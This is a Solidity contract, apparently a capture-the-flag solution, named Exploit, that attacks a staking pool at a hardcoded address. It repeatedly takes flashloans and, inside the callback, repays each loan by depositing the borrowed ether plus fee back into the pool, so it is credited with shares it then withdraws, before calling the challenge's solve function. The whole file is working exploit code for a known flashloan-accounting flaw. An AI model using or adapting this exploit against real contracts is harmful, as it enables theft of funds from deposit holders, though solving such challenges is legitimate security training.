// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IStakePoolFlashloanReceiver {
    function onStakPoolFlashloan(uint256 amount, uint256 fee, bytes memory data) external payable;
}

interface Pool {
    function flashloan(uint256 amount, bytes calldata data) external;
    function faucet() external;
    function solve() external;
    function deposit() external payable returns (uint256);
    function withdraw(uint256 shares) external returns (uint256);
    function balanceOf(address a) external returns (uint256);
}


contract Exploit is IStakePoolFlashloanReceiver{
    address target;
    function exploit() public payable {
        // write code here
   
        target = 0x511978e46Fc117795431f7493fB5288592097C4A;
        Pool(target).faucet();
        Pool(target).flashloan(2 ether, "");
        uint256 balance = Pool(target).balanceOf(address(this));
        Pool(target).withdraw(balance);

        Pool(target).flashloan(balance, "");
        balance = Pool(target).balanceOf(address(this));
        Pool(target).withdraw(balance);

        Pool(target).flashloan(2 ether, "");
        balance = Pool(target).balanceOf(address(this));
        Pool(target).withdraw(balance);

        Pool(target).flashloan(1 ether, "");
        balance = Pool(target).balanceOf(address(this));
        Pool(target).withdraw(balance);
        Pool(target).solve();
    }

    receive() external payable {}

    function onStakPoolFlashloan(uint256 amount, uint256 fee, bytes memory data) external payable {
        Pool(target).deposit{value: msg.value + fee}();
    }

}